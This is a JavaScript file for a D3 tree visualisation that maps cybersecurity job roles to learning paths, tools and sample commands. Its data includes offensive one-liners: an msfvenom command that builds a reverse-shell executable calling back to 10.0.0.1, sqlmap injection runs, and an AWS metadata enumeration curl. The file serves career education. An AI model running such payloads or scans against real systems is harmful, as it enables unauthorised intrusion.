// script.js
// Horizontal D3 tree with zoom/pan, collapse, info pane, search & level filter.
// Uses the full job-role oriented DATA (A→Z roles + learning path, tools, commands).

// ------------------ DATA ------------------
const DATA = {
  name: "Cybersecurity • Job Roles & Learning Paths",
  short: "A → Z job roles, SOC levels, red/blue/cloud/GRC and required learning.",
  level: "All",
  children: [
    // SOC Family (L1 → L2 → L3 → SOC CIRT)
    {
      name: "SOC (Security Operations Center)",
      family: "SOC",
      color: "#2196f3",
      short: "Operational monitoring & triage — L1 → L3 career ladder",
      level: "Beginner → Advanced",
      children: [
        {
          name: "SOC L1 Analyst",
          short: "Alert triage, basic log analysis, escalate when needed",
          level: "Beginner",
          learning: [
            "Understand logs: Windows Event, Linux syslog, firewall logs",
            "Basics of SIEM (search, alerts, filters)",
            "Incident ticketing & escalation procedures"
          ],
          tools: ["Splunk (search)", "Elastic SIEM", "QRadar", "OSQuery"],
          commands: [
            "Splunk: index=main sourcetype=wineventlog | stats count by EventCode",
            "osquery: select * from processes where name='powershell.exe';"
          ]
        },
        {
          name: "SOC L2 Analyst",
          short: "Deeper investigation, IOC enrichment, forensic triage",
          level: "Intermediate",
          learning: [
            "Memory & disk indicators, process analysis",
            "Network flow analysis (Zeek) and PCAP triage",
            "Use enrichment sources: VirusTotal, ThreatIntel feeds"
          ],
          tools: ["Volatility", "Wireshark", "Zeek", "MISP"],
          commands: [
            "volatility: volatility -f mem.dmp --profile=Win7SP1x64 pslist",
            "tcpdump: tcpdump -r capture.pcap -n -vv"
          ]
        },
        {
          name: "SOC L3 / Threat Hunter",
          short: "Hunt for stealthy intrusions, custom detections, adversary emulation",
          level: "Advanced",
          learning: [
            "Hunt techniques & YARA rules",
            "Develop detections & playbooks",
            "Adversary TTP mapping (MITRE ATT&CK)"
          ],
          tools: ["YARA", "Elastic SIEM", "MITRE ATT&CK Navigator", "PL/SQL for logs"],
          commands: [
            "yara -r suspicious_rules.yar sample.bin",
            "elk query: host.name: \"host1\" AND event.action: \"process_started\""
          ]
        }
      ]
    },

    // Red Team / Offensive
    {
      name: "Red Team / Offensive Security",
      family: "Red Team",
      color: "#e53935",
      short: "Adversary simulation, exploitation, persistence, custom tooling",
      level: "Intermediate → Advanced",
      children: [
        {
          name: "Penetration Tester (Web/Infra)",
          short: "Perform authorized testing to find vulnerabilities",
          level: "Intermediate",
          learning: [
            "OWASP Top10, Burp Suite workflow",
            "Network exploitation basics and pivoting",
            "Report writing and remediation guidance"
          ],
          tools: ["Burp Suite", "nmap", "Metasploit", "sqlmap"],
          commands: [
            "nmap -sC -sV -oA target_scan 10.0.0.5",
            "sqlmap -u 'http://test/?id=1' --batch --level=3"
          ]
        },
        {
          name: "Exploit Developer / Binary Exploitation",
          short: "Buffer overflows, ROP, kernel exploits",
          level: "Advanced",
          learning: [
            "x86/x64 assembly and memory layout",
            "GDB/pwndbg, ROP chains, ASLR/DEP bypass techniques"
          ],
          tools: ["GDB", "pwntools", "radare2", "Ghidra"],
          commands: [
            "gdb -q ./vulnerable",
            "python3 -c 'from pwn import *; p=process(\"./vuln\");'"
          ]
        },
        {
          name: "Red Team Operator",
          short: "Full-scope emulation: OPSEC, C2, lateral movement",
          level: "Advanced",
          learning: [
            "Operational planning, covert comms, persistence",
            "Custom implants and evasion"
          ],
          tools: ["Cobalt Strike (licensed)", "Empire", "Caldera", "BloodHound"],
          commands: [
            "# Example: create payload with msfvenom",
            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f exe -o shell.exe"
          ]
        }
      ]
    },

    // Blue Team / Defensive
    {
      name: "Blue Team / Defensive",
      family: "Blue Team",
      color: "#2e7d32",
      short: "Protect, detect, respond, and recover",
      level: "Intermediate → Advanced",
      children: [
        {
          name: "Incident Responder",
          short: "Contain, eradicate, and recover from breaches",
          level: "Advanced",
          learning: [
            "IR playbooks, containment steps, root cause analysis",
            "Memory & disk forensics, timelines"
          ],
          tools: ["Volatility", "Autopsy", "FTK Imager"],
          commands: [
            "fls -r image.dd",
            "volatility -f mem.dmp pslist"
          ]
        },
        {
          name: "Detection Engineer",
          short: "Build rules, detection logic, SIEM content",
          level: "Advanced",
          learning: [
            "Analytics engineering for SIEM",
            "Behavioral baselining and anomaly detection"
          ],
          tools: ["Splunk", "Elastic", "Sigma"],
          commands: [
            "splunk search: index=security sourcetype=wineventlog EventCode=4624 | stats count by AccountName"
          ]
        }
      ]
    },

    // Cloud Security
    {
      name: "Cloud Security",
      family: "Cloud",
      color: "#0097a7",
      short: "Cloud configurations, IAM, lateral movement in cloud",
      level: "Intermediate → Advanced",
      children: [
        {
          name: "Cloud Security Engineer",
          short: "Harden cloud workloads, detect exposures",
          level: "Intermediate",
          learning: [
            "IAM best practices, least privilege",
            "Cloud logging and cloud-forensics basics"
          ],
          tools: ["ScoutSuite", "Pacu", "CloudTrail", "Azure AD"],
          commands: [
            "# AWS metadata",
            "curl http://169.254.169.254/latest/meta-data/  # (read-only; used in enumeration)"
          ]
        },
        {
          name: "Cloud Penetration Tester",
          short: "Exploit misconfigurations, IAM misuses",
          level: "Advanced",
          learning: [
            "Attack paths, privilege chains in cloud",
            "Abuse of managed services and trust boundaries"
          ],
          tools: ["Pacu", "CloudSploit", "ScoutSuite"],
          commands: [
            "pacu> run iam__enum --profile targetprofile"
          ]
        }
      ]
    },

    // AppSec & DevSecOps
    {
      name: "Application Security (AppSec)",
      family: "AppSec",
      color: "#8e44ad",
      short: "Secure SDLC, code reviews, CI/CD security",
      level: "Intermediate",
      children: [
        {
          name: "AppSec Engineer",
          short: "Integrate security into development lifecycle",
          level: "Intermediate",
          learning: [
            "Threat modeling, secure code patterns, SAST/DAST",
            "CI/CD security (secrets, pipelines, containers)"
          ],
          tools: ["Snyk", "OWASP ZAP", "SonarQube"],
          commands: [
            "snyk test --org=myorg",
            "zap-cli quick-scan --self-contained -r http://localhost:8080"
          ]
        },
        {
          name: "DevSecOps",
          short: "Automate security as code in pipelines",
          level: "Intermediate → Advanced",
          learning: [
            "IaC scanning, container runtime security",
            "Shift-left testing and secure build pipelines"
          ],
          tools: ["Trivy", "Checkov", "Falco"],
          commands: [
            "trivy fs --severity HIGH,CRITICAL .",
            "checkov -d ."
          ]
        }
      ]
    },

    // Forensics & Malware
    {
      name: "Forensics & Malware Analysis",
      family: "Forensics",
      color: "#6d4c41",
      short: "Memory & disk analysis, static & dynamic malware analysis",
      level: "Advanced",
      children: [
        {
          name: "Memory Forensics Analyst",
          short: "Analyze RAM dumps for persistence and artifacts",
          level: "Advanced",
          learning: [
            "Volatility plugins, timeline creation, API hooks"
          ],
          tools: ["Volatility", "Rekall"],
          commands: [
            "volatility -f memory.raw windows.pslist"
          ]
        },
        {
          name: "Malware Analyst",
          short: "Reverse-engineering and behavior analysis",
          level: "Advanced",
          learning: [
            "Static/dynamic analysis, sandboxing, unpacking"
          ],
          tools: ["Ghidra", "x64dbg", "Cuckoo Sandbox"],
          commands: [
            "ghidraRun.bat -import sample.exe"
          ]
        }
      ]
    },

    // GRC / Risk / Compliance
    {
      name: "GRC • Risk & Compliance",
      family: "GRC",
      color: "#ff9800",
      short: "Governance, risk assessments, compliance frameworks",
      level: "All",
      children: [
        {
          name: "Security Analyst • Compliance",
          short: "Audits, policies, controls mapping",
          level: "Intermediate",
          learning: [
            "Understand ISO27001, NIST CSF, GDPR basics",
            "Risk assessments and control implementation"
          ],
          tools: ["Archer", "Excel", "GRC platforms"],
          commands: []
        },
        {
          name: "Security Architect",
          short: "Design secure systems and enterprise controls",
          level: "Advanced",
          learning: [
            "Threat modeling at design time",
            "Secure architecture patterns and strategy"
          ],
          tools: ["Draw.io", "ThreatModeler"],
          commands: []
        }
      ]
    },

    // Threat Intelligence & OSINT
    {
      name: "Threat Intelligence • OSINT",
      family: "Threat Intel",
      color: "#7b1fa2",
      short: "Collect and analyze threat data, actor profiling",
      level: "Advanced",
      children: [
        {
          name: "Threat Intel Analyst",
          short: "Operationalize IOCs and TTPs",
          level: "Advanced",
          learning: [
            "MITRE ATT&CK mapping, IOC ingestion",
            "Analysts' reports and dissemination"
          ],
          tools: ["MISP", "Maltego", "Recorded Future"],
          commands: []
        }
      ]
    },

    // Career & Certifications node
    {
      name: "Career Paths & Certifications",
      family: "Career",
      color: "#4caf50",
      short: "Suggested certs & progression for each role",
      level: "All",
      children: [
        { name: "Entry • Beginner certs", short: "CompTIA Security+, eJPT, TryHackMe paths" },
        { name: "Mid-level certs", short: "OSCP, Pentest+, GCIA, GCIH" },
        { name: "Advanced certs", short: "OSCE, CRTO, CISSP, CISM" }
      ]
    },

    // Tooling master-list (quick references)
    {
      name: "Tooling Master List",
      family: "Tools",
      color: "#607d8b",
      short: "Quick reference of common tools and one-liners",
      level: "All",
      children: [
        { name: "nmap", short: "Host/port discovery", tools: ["nmap -A -T4 target"] },
        { name: "tcpdump / Wireshark", short: "Packet capture", tools: ["tcpdump -i eth0 -w out.pcap"] },
        { name: "sqlmap", short: "SQL injection automation", tools: ["sqlmap -u 'http://url?id=1' --batch"] }
      ]
    }
  ]
};

// ------------------ Setup SVG and layout ------------------
const svg = d3.select("#treeSvg");
const wrap = document.getElementById("treewrap");
const infoPane = document.getElementById("infopane");
const width = Math.max(900, wrap.clientWidth * 0.72);
const height = Math.max(600, wrap.clientHeight);
svg.attr("viewBox", [0, 0, width, height]).attr("preserveAspectRatio", "xMidYMid meet");

const gZoom = svg.append("g").attr("class", "zoomLayer");
const gLinks = gZoom.append("g").attr("class", "links");
const gNodes = gZoom.append("g").attr("class", "nodes");

const tree = d3.tree().size([height - 100, width - 380]); // horizontal
let root = d3.hierarchy(DATA);
root.x0 = height / 2;
root.y0 = 0;

// assign branch colors to top-level children and propagate
const palette = ["#2196f3","#e53935","#2e7d32","#0097a7","#8e44ad","#6d4c41","#ff9800","#7b1fa2","#4caf50","#607d8b"];
function assignBranchColors() {
  if (!root.children) return;
  root.children.forEach((c, idx) => {
    const color = c.data.color || palette[idx % palette.length];
    c.each(n => n.data._branchColor = color);
  });
}
assignBranchColors();

// collapse all
function collapse(d) {
  if (d.children) {
    d._children = d.children;
    d._children.forEach(collapse);
    d.children = null;
  }
}
if (root.children) root.children.forEach(collapse);

// stable id
let idCounter = 0;

// ------------------ Zoom & pan ------------------
const zoom = d3.zoom()
  .scaleExtent([0.2, 3])
  .on("zoom", (event) => {
    gZoom.attr("transform", event.transform);
  });

svg.call(zoom);

// add buttons behavior
document.getElementById("zoomIn").addEventListener("click", () => zoomBy(1.2));
document.getElementById("zoomOut").addEventListener("click", () => zoomBy(0.8));
document.getElementById("fit").addEventListener("click", fitToScreen);
document.getElementById("reset").addEventListener("click", () => {
  document.getElementById("search").value = "";
  document.getElementById("levelFilter").value = "All";
  root.children && root.children.forEach(collapse);
  assignBranchColors();
  update(root);
  fitToScreen();
});

function zoomBy(factor) {
  svg.transition().duration(250).call(zoom.scaleBy, factor);
}

// fit to screen: center root top-left -> translate so root at x=40
function fitToScreen() {
  const transform = d3.zoomIdentity.translate(120, 20).scale(1);
  svg.transition().duration(350).call(zoom.transform, transform);
}

// ------------------ Update function ------------------
function update(source) {
  tree(root);

  const nodes = root.descendants();
  const links = root.links();

  // NODE JOIN
  const nodeSel = gNodes.selectAll("g.node").data(nodes, d => d.data.__id || (d.data.__id = ++idCounter));

  // EXIT
  nodeSel.exit().transition().duration(300).attr("opacity", 0).remove();

  // ENTER
  const nodeEnter = nodeSel.enter().append("g")
    .attr("class", "node")
    .attr("transform", d => `translate(${source.y0},${source.x0})`)
    .on("click", (event, d) => {
      if (d.children) { d._children = d.children; d.children = null; }
      else { d.children = d._children; d._children = null; }
      update(d);
      showDetails(d.data);
    });

  nodeEnter.append("circle")
    .attr("r", 1e-6)
    .attr("fill", d => d.data._branchColor || "#58a6ff")
    .attr("stroke", "#04121a")
    .attr("stroke-width", 1.5)
    .on("mouseover", (event, d) => showTooltip(event, d.data))
    .on("mousemove", (event) => moveTooltip(event))
    .on("mouseout", hideTooltip);

  nodeEnter.append("text")
    .attr("dy", "0.32em")
    .attr("x", 14)
    .attr("fill", "#e6f3ff")
    .style("font-size", 12)
    .text(d => d.data.name);

  // UPDATE + TRANSITION
  const nodeMerge = nodeEnter.merge(nodeSel);
  nodeMerge.transition().duration(350).attr("transform", d => `translate(${d.y},${d.x})`);
  nodeMerge.select("circle").transition().duration(350).attr("r", 7).attr("fill", d => d.data._branchColor || "#58a6ff");

  // LINKS
  const linkSel = gLinks.selectAll("path.link").data(links, d => d.target.data.__id);

  linkSel.exit().transition().duration(300).style("opacity", 0).remove();

  const linkEnter = linkSel.enter().append("path")
    .attr("class", "link")
    .attr("d", d => {
      const o = {x: source.x0, y: source.y0};
      return diagonal({source: o, target: o});
    })
    .attr("stroke", d => d.target.data._branchColor || "rgba(255,255,255,0.06)")
    .attr("stroke-width", 1.2)
    .attr("fill", "none");

  linkEnter.merge(linkSel).transition().duration(350).attr("d", d => diagonal(d));

  // store positions
  nodes.forEach(d => { d.x0 = d.x; d.y0 = d.y; });
}

// generator for horizontal links
function diagonal(d) {
  return d3.linkHorizontal()
    .x(d => d.y)
    .y(d => d.x)(d);
}

// initial draw
update(root);
fitToScreen();
showDetails(DATA);

// ------------------ Info pane population ------------------
function showDetails(data) {
  document.getElementById("nodeTitle").textContent = data.name || "—";
  document.getElementById("nodeShort").textContent = data.short || "—";
  document.getElementById("nodeLevel").textContent = data.level || "—";
  document.getElementById("nodeFamily").textContent = data.family || (data._branchColor ? "Domain" : "—");

  const lp = document.getElementById("learningPath");
  lp.innerHTML = "";
  if (Array.isArray(data.learning)) {
    data.learning.forEach(step => {
      const li = document.createElement("li"); li.textContent = step; lp.appendChild(li);
    });
  } else {
    const li = document.createElement("li"); li.textContent = data.short || "No extended learning path provided."; lp.appendChild(li);
  }

  const toolsDiv = document.getElementById("nodeTools");
  toolsDiv.innerHTML = "";
  if (Array.isArray(data.tools)) {
    data.tools.forEach(t => {
      const s = document.createElement("span"); s.className = "tag"; s.textContent = t; toolsDiv.appendChild(s);
    });
  }

  const cmdDiv = document.getElementById("nodeCommands");
  cmdDiv.innerHTML = "";
  if (Array.isArray(data.commands)) {
    data.commands.forEach(c => {
      const d = document.createElement("div"); d.className = "cmd"; d.textContent = c; cmdDiv.appendChild(d);
    });
  } else if (Array.isArray(data.tools)) {
    // show basic one-liners from tools if present
    data.tools.slice(0,6).forEach(t => {
      const d = document.createElement("div"); d.className = "cmd"; d.textContent = t; cmdDiv.appendChild(d);
    });
  }

  const resDiv = document.getElementById("nodeResources");
  resDiv.innerHTML = "";
  if (Array.isArray(data.resources)) {
    data.resources.forEach(r => { const s=document.createElement("span"); s.className="tag"; s.textContent=r; resDiv.appendChild(s); });
  } else {
    // default suggestions
    const s1 = document.createElement("span"); s1.className="tag"; s1.textContent="TryHackMe / HTB / VulnHub"; resDiv.appendChild(s1);
    const s2 = document.createElement("span"); s2.className="tag"; s2.textContent="Official docs & vendor blogs"; resDiv.appendChild(s2);
  }
}

// ------------------ Tooltip ------------------
const tt = d3.select("body").append("div").attr("class","tooltip").style("visibility","hidden");
function showTooltip(event, data) {
  const html = `<strong>${escapeHtml(data.name || "")}</strong><div style="margin-top:6px;font-size:12px;color:#bfcfe8">${escapeHtml(data.short || "")}</div>`;
  tt.html(html).style("visibility","visible");
  moveTooltip(event);
}
function moveTooltip(event){ tt.style("left",(event.pageX+12)+"px").style("top",(event.pageY+12)+"px"); }
function hideTooltip(){ tt.style("visibility","hidden"); }
function escapeHtml(s){return String(s).replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}

// ------------------ Search & Level Filter ------------------
const searchInput = document.getElementById("search");
const levelFilter = document.getElementById("levelFilter");

searchInput.addEventListener("keydown", (e) => { if (e.key === "Enter") applyFilters(); });
levelFilter.addEventListener("change", applyFilters);

function applyFilters() {
  const q = (searchInput.value || "").trim().toLowerCase();
  const level = levelFilter.value;
  // mark matches
  root.each(d => {
    const name = (d.data.name||"").toLowerCase();
    const short = (d.data.short||"").toLowerCase();
    const tools = (d.data.tools||[]).join(" ").toLowerCase();
    d.data._match = false;
    if (!q || name.includes(q) || short.includes(q) || tools.includes(q)) d.data._match = true;
    if (level !== "All" && (d.data.level || "").toLowerCase().indexOf(level.toLowerCase()) === -1) d.data._match = false;
  });

  // expand ancestors that lead to matches, collapse non-matching branches
  function openIfMatch(node) {
    let any = node.data._match;
    if (node.children) {
      node.children.forEach(c => { if (openIfMatch(c)) any = true; });
    }
    if (!any) {
      if (node.children) { node._children = node.children; node._children.forEach(collapse); node.children = null; }
    } else {
      // expand
      if (node._children) { node.children = node._children; node._children = null; }
    }
    return any;
  }
  if (root.children) root.children.forEach(openIfMatch);
  update(root);
  fitToScreen();
}

// ------------------ End of script ------------------
